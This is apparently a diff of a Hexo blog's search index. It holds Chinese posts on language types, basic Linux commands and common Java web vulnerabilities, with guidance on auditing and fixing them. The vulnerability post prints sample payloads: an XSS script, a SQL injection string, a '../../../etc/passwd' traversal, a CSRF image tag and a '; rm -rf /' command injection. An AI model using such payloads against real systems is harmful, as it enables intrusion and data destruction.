-<h6 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h6><p><strong>定义</strong>：解释型语言的源代码不是直接翻译成机器码，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。在运行的时候才将源程序翻译成机器码，翻译一句，然后执行一句，直至结束。</p>
-<p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p>
-<p><strong>缺点</strong>：每次运行的时候都要解释一遍，性能上不如编译型语言。</p>
-<p><strong>总结</strong>：执行速度慢、效率低；依靠解释器、跨平台性好。</p>
-<p><strong>代表语言</strong>：JavaScript、Python、Erlang、PHP、Perl、Ruby。</p>
-<h5 id="混合型语言"><a href="#混合型语言" class="headerlink" title="混合型语言"></a>混合型语言</h5><p><strong>定义</strong>：既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕，就出现了半编译，半解释型语言。</p>
-<p>比如C#，C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。.NET在编译成IL代码后，保存在dll中，首次运行时由JIT在编译成机器码缓存在内存中，下次直接执行。严格来说混合型语言属于解释型语言，C#更接近编译型语言。</p>
-<p><strong>Java即是编译型的，也是解释型语言，总的来说Java更接近解释型语言。</strong></p>
-<p>可以说它是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就什么用都没有。同时围绕JVM的效率问题，会涉及一些如JIT、AOT等优化技术，例如JIT技术，会将热点代码编译成机器码。而AOT技术，是在运行前，通过工具直接将字节码转换为机器码。</p>
-<p>可以说它是解释型的。因为Java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释运行的。</p>
-<h3 id="2-动态类型语言和静态类型语言"><a href="#2-动态类型语言和静态类型语言" class="headerlink" title="2.动态类型语言和静态类型语言"></a>2.动态类型语言和静态类型语言</h3><h6 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h6><p>动态类型语言：在运行期间才去做数据类型检查的语言，说的是数据类型。动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p>
-<p>代表语言：Python、Ruby、Erlang、JavaScript、Swift、PHP、Perl。</p>
-<h6 id="静态类型语言"><a href="#静态类型语言" class="headerlink" title="静态类型语言"></a>静态类型语言</h6><p>静态类型语言的数据类型是在编译期间（或运行之前）确定的，编写代码的时候要明确确定变量的数据类型。</p>
-<p>代表语言：C、C++、C#、Java、Object-C。</p>
-<h3 id="3-动态语言和静态语言"><a href="#3-动态语言和静态语言" class="headerlink" title="3.动态语言和静态语言"></a>3.动态语言和静态语言</h3><h5 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h5><p>动态类型语言和动态语言是完全不同的两个概念。</p>
-<p>动态语言：说的是运行时改变结构，说的是代码结构。在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p>
-<p>代表语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p>
-<h5 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h5><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -2395,6 +2395,262 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux</title>
+    <url>/2023/08/09/Linux/</url>
+    <content><![CDATA[<h1 id="Linux操作系统获取方式"><a href="#Linux操作系统获取方式" class="headerlink" title="Linux操作系统获取方式"></a>Linux操作系统获取方式</h1><span id="more"></span>
+
+<p>以centOS为例，获取方法大致分为两种：</p>
+<ul>
+<li><p>从<a href="https://www.centos.org/download/">CentOS官网</a>获取；</p>
+</li>
+<li><p>从镜像网站获取</p>
+<ul>
+<li><p>以</p>
+<p>阿里云镜像</p>
+<p>网站平台为例。</p>
+<ul>
+<li>新版本镜像地址： <a href="https://mirrors.aliyun.com/centos/">https://mirrors.aliyun.com/centos/</a></li>
+<li>旧版本镜像地址： <a href="https://mirrors.aliyun.com/centos-vault/">https://mirrors.aliyun.com/centos-vault/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Linux-接口"><a href="#Linux-接口" class="headerlink" title="Linux 接口"></a>Linux 接口</h1><p>Linux 系统是一种金字塔模型的系统，如下所示</p>
+<p><img src="https://img2020.cnblogs.com/blog/1515111/202010/1515111-20201010070233641-1312039505.png" alt="img"></p>
+<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>pwd 显示工作路径</p>
+<p>shutdown -h now 关闭系统  &#x2F;halt 关闭系统</p>
+<p>shutdown -r now 重启 &#x2F; reboot 重启</p>
+<p>systemctl stop firewalld　　关闭防火墙</p>
+<p>ip addr　　查看ip地址</p>
+<p>1、<strong>cd命令</strong>：这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p>
+<p>cd &#x2F;home 　 进入根目录下面的home目录<br>cd home 　 进入当前目录下的home目录<br>cd ..　　　 返回上一层目录<br>cd ..&#x2F;.. 　　 返回上两级目录<br>cd &#x2F;　　　　　返回跟目录<br>cd - 　　　　返回上次所在的目录 </p>
+<p>2、<strong>ls命令</strong>：这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p>
+<p>ls 　　　查看目录中的文件<br>ls -a　　列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来<br>ls -l 　 显示文件和目录的详细资料 </p>
+<p>ls A*    意味着只列出以 A 为开头的所有文件</p>
+<p>3、<strong>mkdir命令</strong>：创建</p>
+<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’<br>mkdir dir1 dir2 同时创建两个目录 </p>
+<p>4、<strong>rm命令</strong>：删除</p>
+<p>rm -f file1　　 删除一个叫做 ‘file1’ 的文件’<br>rmdir dir1 　　删除一个叫做 ‘dir1’ 的目录’ （空目录才能删除）<br>rm -rf dir1 　　删除一个叫做 ‘dir1’ 的目录并同时删除其内容<br>rm -rf dir1 dir2　　 同时删除两个目录及它们的内容 </p>
+<p>rm A*      会移除所有以 A 为开头的文件而不是只删除文件名是 <code>A*</code> 的文件</p>
+<p>5、<strong>mv命令</strong>：该命令用于移动文件、目录或更名，move之意，它的常用参数如下：-f 如果目标文件已经存在，不会询问而直接覆盖</p>
+<p>mv file1 file2  把文件file1重命名为file2 </p>
+<p>mv file1 file2 dir  把文件file1、file2移动到目录dir中</p>
+<p>6、<strong>cp命令</strong>：该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下， 它的常用参数如下：</p>
+<p>cp -a file1 file2 连同文件的所有特性把文件file1复制成文件file2<br>cp dir&#x2F;* . 复制一个目录下的所有文件到当前工作目录<br>cp -a &#x2F;tmp&#x2F;dir1 . 复制一个目录到当前工作目录<br>cp -a dir1 dir2 复制一个目录 </p>
+<p>7、<strong>find命令</strong>：find是一个基于查找的功能非常强大的命令</p>
+<p>find &#x2F; -name file1 从 ‘&#x2F;‘ 开始进入根文件系统搜索文件和目录<br>find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find &#x2F;home&#x2F;user1 -name *.bin 在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件<br>find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 </p>
+<p>8、<strong>ps命令</strong>：该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p>
+<p>-A ：所有的进程均显示出来<br>-a ：不与terminal有关的所有进程<br>-u ：有效用户的相关进程<br>-x ：一般与a参数一起使用，可列出较完整的信息<br>-l ：较长，较详细地将PID的信息列出<br>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p>
+<p>ps aux  查看系统所有的进程数据<br>ps ax  查看不与terminal有关的所有进程<br>ps -lA  查看系统所有的进程数据<br>ps axjf  查看连同一部分进程树状态</p>
+<p>9、<strong>kill命令</strong>：该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p>
+<p>kill -signal PID<br>signal的常用参数如下：注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p>
+<p>1：SIGHUP，启动被终止的进程<br>2：SIGINT，相当于输入ctrl+c，中断一个程序的进行<br>9：SIGKILL，强制中断一个进程的进行<br>15：SIGTERM，以正常的结束进程方式来终止进程<br>17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行<br>例如：</p>
+<p># 以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程<br>kill -SIGTERM %1<br># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得<br>kill -SIGHUP PID </p>
+<p> 10、<strong>tar命令</strong>：该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p>
+<ol>
+<li>压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称 </li>
+<li>查询：tar -jtv -f filename.tar.bz2 </li>
+<li>解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</li>
+</ol>
+<p>11、chmod命令：该命令用于改变文件的权限，一般的用法如下：</p>
+<p>chmod -R 777   chmod -R 777 意思就是将当前目录及目录下所有文件都给予777权限（所有权限）</p>
+<p><strong>查看文件内容</strong><br>cat file1 从第一个字节开始正向查看文件的内容<br>tac file1 从最后一行开始反向查看一个文件的内容<br>more file1 查看一个长文件的内容<br>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作<br>head -2 file1 查看一个文件的前两行<br>tail -2 file1 查看一个文件的最后两行<br>tail -f &#x2F;var&#x2F;log&#x2F;messages 实时查看被添加到一个文件中的内容 </p>
+<p><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong><br>yum install package_name 下载并安装一个rpm包<br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update package_name.rpm 更新当前系统中所有安装的rpm包<br>yum update package_name 更新一个rpm包<br>yum remove package_name 删除一个rpm包<br>yum list 列出当前系统中安装的所有包<br>yum search package_name 在rpm仓库中搜寻软件包<br>yum clean packages 清理rpm缓存删除下载的包<br>yum clean headers 删除所有头文件<br>yum clean all 删除所有缓存的包和头文件 </p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java漏洞</title>
+    <url>/2023/08/26/Java%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="一、跨站脚本（Cross-Site-Scripting，XSS）"><a href="#一、跨站脚本（Cross-Site-Scripting，XSS）" class="headerlink" title="一、跨站脚本（Cross-Site Scripting，XSS）"></a>一、跨站脚本（Cross-Site Scripting，XSS）</h1><span id="more"></span>
+
+<p>是一种常见的Web安全漏洞，攻击者通过注入恶意代码到网页中，使得这些代码被其他用户的浏览器执行，从而攻击用户的计算机系统.<br><strong>XSS攻击通常分为以下几类：</strong></p>
+<ul>
+<li><p>反射型XSS：攻击者构造一个恶意的URL，将恶意代码注入到URL中，诱使用户点击该URL，从而触发攻击。</p>
+</li>
+<li><p>存储型XSS：攻击者将恶意代码存储在服务器上的数据库中，当其他用户访问相应的页面时，这些代码会被读取并执行，从而攻击用户。</p>
+</li>
+<li><p>DOM-based XSS：攻击者通过修改浏览器中的DOM树，将恶意代码注入到网页中，诱使用户执行恶意代码。</p>
+</li>
+</ul>
+<p>当Java程序扫描到跨站脚本漏洞时，通常会给出一些具体的提示信息，比如漏洞出现的位置、攻击者可以注入的代码类型等等。一般来说，修复跨站脚本漏洞需要在应用程序的代码中加入一些安全措施，如输入验证、输出过滤等，以防止攻击者注入恶意代码。<br><strong>跨站脚本示例：</strong></p>
+<p>示例一：</p>
+<p>假设有一个搜索页面，用户在该页面输入一个关键词，然后该关键词将被发送到服务器进行搜索，最后将搜索结果返回给用户。</p>
+<p>如果程序没有对用户输入的关键词进行过滤，攻击者就可以在搜索框中输入一段恶意的脚本代码，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当其他用户访问该页面并搜索该关键词时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
+<p>为了避免这种攻击，程序应该对用户输入的关键词进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，可以使用一些Web开发框架提供的安全函数来实现这一点，如在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤。</p>
+<p>示例二</p>
+<p>假设有一个Java Web应用程序，其中一个Servlet接收一个名为”message”的参数，并将其显示在页面上。代码如下：</p>
+<pre><code>@WebServlet(&quot;/xss&quot;)
+public class XssServlet extends HttpServlet &#123;
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;
+        String message = request.getParameter(&quot;message&quot;);
+        response.setContentType(&quot;text/html&quot;);
+        PrintWriter out = response.getWriter();
+        out.println(&quot;&lt;html&gt;&quot;);
+        out.println(&quot;&lt;head&gt;&quot;);
+        out.println(&quot;&lt;title&gt;XSS漏洞示例&lt;/title&gt;&quot;);
+        out.println(&quot;&lt;/head&gt;&quot;);
+        out.println(&quot;&lt;body&gt;&quot;);
+        out.println(&quot;&lt;h1&gt;&quot; + message + &quot;&lt;/h1&gt;&quot;);
+        out.println(&quot;&lt;/body&gt;&quot;);
+        out.println(&quot;&lt;/html&gt;&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>如果程序没有对用户输入的”message”参数进行过滤和转义，攻击者就可以在URL中注入恶意代码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/xss?message=&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当其他用户访问该URL时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
+<p>为了避免这种攻击，程序应该对用户输入的参数进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤，以确保用户输入的数据不会包含任何恶意的脚本。</p>
+<h1 id="二、SQL注入（SQL-Injection）漏洞"><a href="#二、SQL注入（SQL-Injection）漏洞" class="headerlink" title="二、SQL注入（SQL Injection）漏洞"></a>二、SQL注入（SQL Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意SQL语句来获取敏感信息，修改数据或者执行任意代码。<br><strong>SQL注入漏洞示例</strong></p>
+<p>假设一个Web应用程序中有一个搜索功能，用户可以通过输入关键字搜索相关内容。如果程序没有对用户输入的关键字进行过滤，攻击者就可以在搜索框中注入恶意的SQL语句，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR 1=1; --</span><br></pre></td></tr></table></figure>
+
+<p>这段代码将会被拼接到SQL查询语句中，并使查询语句变为：</p>
+<pre><code>SELECT * FROM articles WHERE title=&#39;&#39; OR 1=1; -- &#39;
+</code></pre>
+<p>攻击者就可以绕过身份验证，获取文章列表中所有文章的信息</p>
+<h1 id="三、文件包含（File-Inclusion）漏洞"><a href="#三、文件包含（File-Inclusion）漏洞" class="headerlink" title="三、文件包含（File Inclusion）漏洞"></a>三、文件包含（File Inclusion）漏洞</h1><p>攻击者利用Web应用程序中存在的文件包含漏洞，向应用程序中注入恶意代码，以获取敏感信息或者执行任意代码。<br><strong>文件包含漏洞示例</strong></p>
+<p>假设一个Web应用程序中有一个功能，允许用户在服务器上查看指定的文件。如果程序没有对用户输入的文件名进行过滤，攻击者就可以通过在URL中注入恶意的文件名来读取任意文件，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/viewfile.php?file=../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>这段代码将会被拼接到文件路径中，并使程序读取&#x2F;etc&#x2F;passwd文件并将其显示在页面上，攻击者就可以获取敏感信息</p>
+<h1 id="四、CSRF（Cross-Site-Request-Forgery）漏洞"><a href="#四、CSRF（Cross-Site-Request-Forgery）漏洞" class="headerlink" title="四、CSRF（Cross-Site Request Forgery）漏洞"></a>四、CSRF（Cross-Site Request Forgery）漏洞</h1><p>攻击者通过欺骗用户在已经登录的Web应用程序中执行某些操作，从而窃取用户的身份验证信息或者执行任意操作。<br><strong>CSRF漏洞示例</strong></p>
+<p>假设一个Web应用程序中有一个功能，允许用户通过访问URL来删除自己的帖子。如果程序没有进行CSRF防护，攻击者就可以伪造一个带有删除帖子的请求的页面，欺骗用户点击链接，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://example.com/deletepost.php?postid=123&amp;action=delete&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当用户点击该链接时，程序将会执行删除操作，攻击者就可以删除用户的帖子。</p>
+<h1 id="五、认证与授权漏洞"><a href="#五、认证与授权漏洞" class="headerlink" title="五、认证与授权漏洞"></a>五、认证与授权漏洞</h1><p>攻击者通过欺骗或者绕过Web应用程序的身份验证或者授权机制，获取未授权的访问权限或者执行任意操作。</p>
+<p>认证与授权漏洞示例<br>假设一个Web应用程序中的一个页面需要特定的权限才能访问，例如管理员权限。如果程序没有进行足够的身份验证或者授权机制，攻击者就可以绕过该机制，获取管理员权限并执行任意操作。</p>
+<h1 id="六、逻辑漏洞"><a href="#六、逻辑漏洞" class="headerlink" title="六、逻辑漏洞"></a>六、逻辑漏洞</h1><p>攻击者利用Web应用程序中的逻辑漏洞，绕过应用程序的安全措施，获取未授权的访问权限或者执行任意操作。</p>
+<p>逻辑漏洞示例<br>假设一个Web应用程序中的一个功能需要进行支付，用户需要在完成支付后才能获得相应的商品或者服务。如果程序存在逻辑漏洞，例如没有对支付进行验证或者没有对用户状态进行检查，攻击者就可以绕过支付流程，获得相应的商品或者服务，而不需要真正支付<br>七、敏感数据泄露漏洞</p>
+<p>Web应用程序在处理敏感信息时出现漏洞，导致敏感信息泄露。</p>
+<p>敏感数据泄露漏洞示例<br>假设一个Web应用程序中存储了用户的敏感信息，例如信用卡号、社保号码等等。如果程序没有对这些信息进行足够的保护，攻击者就可以通过利用程序的漏洞或者直接攻击数据库等方式获取这些信息。</p>
+<h1 id="八、命令注入（Command-Injection）漏洞"><a href="#八、命令注入（Command-Injection）漏洞" class="headerlink" title="八、命令注入（Command Injection）漏洞"></a>八、命令注入（Command Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意命令，从而获取敏感信息或者执行任意代码.</p>
+<p>命令注入漏洞示例<br>假设一个Web应用程序中有一个命令行操作的功能，例如允许管理员执行一些命令来管理服务器。如果程序没有对用户输入的命令进行过滤，攻击者就可以在命令中注入恶意的代码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; rm -rf /</span><br></pre></td></tr></table></figure>
+
+<p>这段代码将会被拼接到命令中，并使命令变为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls; rm -rf /</span><br></pre></td></tr></table></figure>
+
+<p>攻击者就可以执行任意代码，删除服务器上的所有文件。</p>
+<p>需要注意的是，以上示例仅仅是每个漏洞类型的一个简单示例，实际的漏洞可能会更加复杂，攻击者也会不断地创造新的攻击方式来绕过应用程序的防御措施。为了确保Web应用程序的安全性，需要开发人员注重代码的安全性，以及定期进行安全测试和漏洞扫描</p>
+<h1 id="审计方法总结"><a href="#审计方法总结" class="headerlink" title="审计方法总结"></a>审计方法总结</h1><p>主要代码审计方法是跟踪用户输入数据和敏感函数参数回溯：跟踪用户的输入数据，判断数据进入的每一个代码逻辑是否有可利用的点，此处的代码逻辑可以是一个函数，或者是条小小的条件判断语句。</p>
+<p>敏感函数参数回溯，根据敏感函数，逆向追踪参数传递的过程。这个方法是最高效，最常用的方法。大多数漏洞的产生是因为函数的使用不当导致的，只要找到这些函数，就能够快速挖掘想要的漏洞。</p>
+<p>以下是基于关键词审计技巧总结：</p>
+<p>在搜索时要注意是否为整个单词,以及小写敏感这些设置</p>
+<table>
+<thead>
+<tr>
+<th align="center">漏洞名称</th>
+<th align="center">关键词</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">密码硬编码、密码明文存储</td>
+<td align="center">password 、pass、jdbc</td>
+</tr>
+<tr>
+<td align="center">XSS</td>
+<td align="center">getParamter、&lt;%&#x3D;、param.</td>
+</tr>
+<tr>
+<td align="center">SQL 注入</td>
+<td align="center">Select、Dao 、from 、delete 、update、insert</td>
+</tr>
+<tr>
+<td align="center">任意文件下载</td>
+<td align="center">download 、fileName 、filePath、write、getFile、getWriter</td>
+</tr>
+<tr>
+<td align="center">任意文件删除</td>
+<td align="center">Delete、deleteFile、fileName 、filePath</td>
+</tr>
+<tr>
+<td align="center">文件上传</td>
+<td align="center">Upload、write、fileName 、filePath</td>
+</tr>
+<tr>
+<td align="center">命令注入</td>
+<td align="center">getRuntime、exec、cmd、shell</td>
+</tr>
+<tr>
+<td align="center">缓冲区溢出</td>
+<td align="center">strcpy,strcat,scanf,memcpy,memmove,memeccpy<br/>Getc(),fgetc(),getchar;read,printf</td>
+</tr>
+<tr>
+<td align="center">XML 注入</td>
+<td align="center">DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser<br/>SAXSource 、TransformerFactory 、SAXTransformerFactory 、</td>
+</tr>
+<tr>
+<td align="center">反序列化漏洞</td>
+<td align="center">ObjectInputStream.readObject、ObjectInputStream.readUnshared、XMLDecoder.readObject<br/>Yaml.load 、 XStream.fromXML 、 ObjectMapper.readValue 、JSON.parseObject</td>
+</tr>
+<tr>
+<td align="center">url 跳转</td>
+<td align="center">sendRedirect、setHeader、forward</td>
+</tr>
+<tr>
+<td align="center">不安全组件暴露</td>
+<td align="center">activity、Broadcast Receiver、Content Provider、Service、 inter-filter</td>
+</tr>
+<tr>
+<td align="center">日志记录敏感信息</td>
+<td align="center">log log.info logger.info</td>
+</tr>
+<tr>
+<td align="center">代码执行</td>
+<td align="center">eval、system、exec</td>
+</tr>
+</tbody></table>
+<h1 id="其他漏洞审计方法"><a href="#其他漏洞审计方法" class="headerlink" title="其他漏洞审计方法"></a>其他漏洞审计方法</h1><ol>
+<li>CSRF</li>
+</ol>
+<p>审计方法:通过查看配置文件有没有配置 csrf 全局过滤器，如果没有则重点看每个操作前有没有添加 token 的防护机制</p>
+<p>在Smpkpiappealcontroller.java中200处，直接用用ids控制删除操作，而没有添加防 csrf的随机token验证检查，存在csrf漏洞。</p>
+<p> Java&#x2F;main&#x2F;com&#x2F;venustech&#x2F;tsoc&#x2F;cupid&#x2F;smp&#x2F;kpi&#x2F;dao&#x2F;smpkpideclardao.java 517行，对传</p>
+<p>入的ids进行删除操作。</p>
+<ol start="2">
+<li>Struts2 远程代码执行漏洞</li>
+</ol>
+<p>审计方法：查看 struts 插件的版本信息是否为漏洞版本漏洞版本查询网址：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
+<ol start="3">
+<li>越权操作</li>
+</ol>
+<p>审计方法：重点关注用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞，有些厂商会使用一些主流的权限框架，例如 shiro ,spring security 等框架，那么需要重点关注框架的配置文件以及实现方法</p>
+<p>漏洞示例：</p>
+<p>在以下文件中采用了 shiro 框架进行权限控制，在代码 58-72 行处为控制访问路径的权限设置，51-55 行处为对 admin 路径下访问限制，只有 SysyUserFilter 设置了 isAccessAllowed 方法,其他过滤均没有</p>
+<p>SysUserFilter 中 isAccessAllowed 具体实现方法如下，90-93 行处没有对是否为当前用户进行判断，导致了越权</p>
+<p>其他过滤文件均只设置了 onAccessDaniad()方法</p>
+<p>如果没有使用框架的话，就要注意每个操作是否有权限</p>
+<p>代码 7 行处获取 session 里的 username，只判断了 username 是不是为空，如果在截取数据包的时候将 username 再重新赋一个值就有可能造成越权漏洞。</p>
+<p> 以这个年度服务费用编制功能为例，测试一下，代码如图所示：</p>
+<ol start="4">
+<li>会话超时设置</li>
+</ol>
+<p>审计方法：</p>
+<p>Javaweb 应用会话超时设置一般有俩种方法：一是在配置文件 web.xml 设置</p>
+<p> 二是通过 java 代码设置</p>
+<ol start="5">
+<li>敏感数据弱加密</li>
+</ol>
+<p>审计方法：</p>
+<p>敏感数据弱加密主要看数据传输中的加密方法，一般写在工具类 util 中以下文件中为 base64 编码方法</p>
+<p>​	</p>
+<p>​	</p>
+<p>​	</p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java安全</title>
     <url>/2023/08/15/Java%E5%AE%89%E5%85%A8/</url>
     <content><![CDATA[<h1 id="Java安全"><a href="#Java安全" class="headerlink" title="Java安全"></a>Java安全</h1><span id="more"></span>
@@ -3061,262 +3317,6 @@ public class demo7777 &#123;
       </tags>
   </entry>
   <entry>
-    <title>Java漏洞</title>
-    <url>/2023/08/26/Java%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="一、跨站脚本（Cross-Site-Scripting，XSS）"><a href="#一、跨站脚本（Cross-Site-Scripting，XSS）" class="headerlink" title="一、跨站脚本（Cross-Site Scripting，XSS）"></a>一、跨站脚本（Cross-Site Scripting，XSS）</h1><span id="more"></span>
-
-<p>是一种常见的Web安全漏洞，攻击者通过注入恶意代码到网页中，使得这些代码被其他用户的浏览器执行，从而攻击用户的计算机系统.<br><strong>XSS攻击通常分为以下几类：</strong></p>
-<ul>
-<li><p>反射型XSS：攻击者构造一个恶意的URL，将恶意代码注入到URL中，诱使用户点击该URL，从而触发攻击。</p>
-</li>
-<li><p>存储型XSS：攻击者将恶意代码存储在服务器上的数据库中，当其他用户访问相应的页面时，这些代码会被读取并执行，从而攻击用户。</p>
-</li>
-<li><p>DOM-based XSS：攻击者通过修改浏览器中的DOM树，将恶意代码注入到网页中，诱使用户执行恶意代码。</p>
-</li>
-</ul>
-<p>当Java程序扫描到跨站脚本漏洞时，通常会给出一些具体的提示信息，比如漏洞出现的位置、攻击者可以注入的代码类型等等。一般来说，修复跨站脚本漏洞需要在应用程序的代码中加入一些安全措施，如输入验证、输出过滤等，以防止攻击者注入恶意代码。<br><strong>跨站脚本示例：</strong></p>
-<p>示例一：</p>
-<p>假设有一个搜索页面，用户在该页面输入一个关键词，然后该关键词将被发送到服务器进行搜索，最后将搜索结果返回给用户。</p>
-<p>如果程序没有对用户输入的关键词进行过滤，攻击者就可以在搜索框中输入一段恶意的脚本代码，比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当其他用户访问该页面并搜索该关键词时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
-<p>为了避免这种攻击，程序应该对用户输入的关键词进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，可以使用一些Web开发框架提供的安全函数来实现这一点，如在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤。</p>
-<p>示例二</p>
-<p>假设有一个Java Web应用程序，其中一个Servlet接收一个名为”message”的参数，并将其显示在页面上。代码如下：</p>
-<pre><code>@WebServlet(&quot;/xss&quot;)
-public class XssServlet extends HttpServlet &#123;
-    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;
-        String message = request.getParameter(&quot;message&quot;);
-        response.setContentType(&quot;text/html&quot;);
-        PrintWriter out = response.getWriter();
-        out.println(&quot;&lt;html&gt;&quot;);
-        out.println(&quot;&lt;head&gt;&quot;);
-        out.println(&quot;&lt;title&gt;XSS漏洞示例&lt;/title&gt;&quot;);
-        out.println(&quot;&lt;/head&gt;&quot;);
-        out.println(&quot;&lt;body&gt;&quot;);
-        out.println(&quot;&lt;h1&gt;&quot; + message + &quot;&lt;/h1&gt;&quot;);
-        out.println(&quot;&lt;/body&gt;&quot;);
-        out.println(&quot;&lt;/html&gt;&quot;);
-    &#125;
-&#125;
-</code></pre>
-<p>如果程序没有对用户输入的”message”参数进行过滤和转义，攻击者就可以在URL中注入恶意代码，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/xss?message=&lt;script&gt;alert(&#x27;XSS attack&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当其他用户访问该URL时，这段恶意代码就会被服务器返回给用户的浏览器执行，从而弹出一个警告框，对用户进行攻击。</p>
-<p>为了避免这种攻击，程序应该对用户输入的参数进行过滤和转义，以确保任何恶意的脚本都无法执行。例如，在Java中可以使用ESAPI库中提供的函数进行输入验证和输出过滤，以确保用户输入的数据不会包含任何恶意的脚本。</p>
-<h1 id="二、SQL注入（SQL-Injection）漏洞"><a href="#二、SQL注入（SQL-Injection）漏洞" class="headerlink" title="二、SQL注入（SQL Injection）漏洞"></a>二、SQL注入（SQL Injection）漏洞</h1><p>攻击者通过在Web应用程序中注入恶意SQL语句来获取敏感信息，修改数据或者执行任意代码。<br><strong>SQL注入漏洞示例</strong></p>
